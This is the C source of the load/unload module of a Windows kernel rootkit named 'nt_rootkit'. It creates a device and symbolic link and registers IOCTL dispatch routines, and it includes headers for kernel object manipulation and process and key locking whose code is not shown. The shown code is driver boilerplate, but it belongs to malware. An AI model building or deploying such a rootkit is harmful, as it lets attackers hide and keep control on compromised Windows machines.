/*
 * driver.c
 * 
 * Description: Rootkit load/unload.
 */

#include <ntddk.h>
#include "ioctl.h"
#include "dkom.h"
#include "lock_proc.h"
#include "lock_key.h"

UNICODE_STRING DEV_NAME = RTL_CONSTANT_STRING(L"\\Device\\nt_rootkit");
UNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L"\\??\\nt_rootkit");

void driver_unload(PDRIVER_OBJECT driver_obj);

NTSTATUS DriverEntry(PDRIVER_OBJECT driver_obj, PUNICODE_STRING reg_path)
{
        UNREFERENCED_PARAMETER(reg_path);
        DbgPrint(DRIVER_PREFIX "entry.");

        driver_obj->DriverUnload = driver_unload;
        driver_obj->MajorFunction[IRP_MJ_CREATE] =
                driver_obj->MajorFunction[IRP_MJ_CLOSE] =
                nt_rootkit_create_close;
        driver_obj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = nt_rootkit_ioctl;

        PDEVICE_OBJECT dev_obj = NULL;
        NTSTATUS status = STATUS_SUCCESS;

        do {
                status = IoCreateDevice(driver_obj, 0, &DEV_NAME, 
                        FILE_DEVICE_UNKNOWN, 0, FALSE, &dev_obj);
                if (!NT_SUCCESS(status)) {
                        DbgPrint(DRIVER_PREFIX "failed to create device.");
                        break;
                }
                DbgPrint(DRIVER_PREFIX "created device.");
                dev_obj->Flags |= DO_DIRECT_IO;

                status = IoCreateSymbolicLink(&SYM_LINK, &DEV_NAME);
                if (!NT_SUCCESS(status)) {
                        DbgPrint(DRIVER_PREFIX "failed to create symlink.");
                        break;
                }
                DbgPrint(DRIVER_PREFIX "created symlink.");
        } while (FALSE);

        if (!NT_SUCCESS(status)) {
                if (dev_obj)
                        IoDeleteDevice(dev_obj);
        }

        return status;
}

void driver_unload(PDRIVER_OBJECT driver_obj)
{
        IoDeleteDevice(driver_obj->DeviceObject);
        IoDeleteSymbolicLink(&SYM_LINK);
        DbgPrint(DRIVER_PREFIX "exit.");
}